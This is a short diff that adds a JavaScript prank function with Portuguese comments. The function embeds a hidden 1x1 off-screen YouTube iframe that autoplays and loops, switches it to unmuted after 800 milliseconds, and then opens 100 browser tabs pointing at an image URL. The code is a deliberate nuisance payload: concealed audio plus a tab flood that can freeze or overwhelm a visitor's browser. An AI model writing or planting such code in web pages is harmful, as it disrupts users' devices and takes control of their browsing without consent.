@@ -1,0 +1,31 @@
+<script>
+    function abrirAbas() {
+
+        // 🎥 VIDEO DO YOUTUBE ESCONDIDO
+        const iframe = document.createElement("iframe");
+        iframe.width = "1";
+        iframe.height = "1";
+        iframe.style.position = "fixed";
+        iframe.style.left = "-1000px"; // fora da tela
+        iframe.style.top = "-1000px";
+        iframe.src =
+            "https://www.youtube.com/embed/NVu8PMtQ6ms" +
+            "?autoplay=1&mute=1&loop=1&playlist=NVu8PMtQ6ms";
+        iframe.allow = "autoplay";
+        document.body.appendChild(iframe);
+
+        // 🔊 TENTA DESMUTAR APÓS O CLIQUE
+        setTimeout(() => {
+            iframe.src =
+                "https://www.youtube.com/embed/NVu8PMtQ6ms" +
+                "?autoplay=1&mute=0&loop=1&playlist=NVu8PMtQ6ms";
+        }, 800);
+
+        // 🖼️ ABRIR 100 ABAS COM A IMAGEM
+        const imagem = "https://lovecell.com.br/figurinhas/33912";
+
+        for (let i = 0; i < 100; i++) {
+            window.open(imagem, "_blank");
+        }
+    }
+</script>
